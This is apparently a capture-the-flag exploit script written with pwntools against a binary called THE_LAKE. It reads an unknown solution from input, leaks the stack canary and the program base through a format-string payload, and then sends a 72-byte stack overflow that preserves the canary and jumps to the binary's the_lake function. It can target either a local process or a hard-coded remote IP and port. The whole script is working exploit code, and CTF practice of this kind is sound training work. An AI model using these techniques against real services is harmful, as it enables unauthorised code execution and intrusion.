#!/usr/bin/python3

from pwn import *

exe = ELF('THE_LAKE', checksec=False)

context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x150C

        c
        ''')
        input()


if args.REMOTE:
    p = remote('165.227.103.166', 6005)
else:
    p = process(exe.path)
GDB()
p.recvuntil(b'solution: ')
sl(input())
pa = "%15$p|%19$p|"
sla(b'will take.', pa)
p.recvuntil(b'I take ')
canary = int(p.recvuntil(b'|', drop=True), 16)
exe.address = int(p.recvuntil(b'|', drop=True), 16) - exe.sym.main
info("canary: " + hex(canary))
info("exe.address: " + hex(exe.address))
pa = b'a'*72 + flat(canary, 0, exe.sym.the_lake)
sla(b'people change.', pa)
p.interactive()
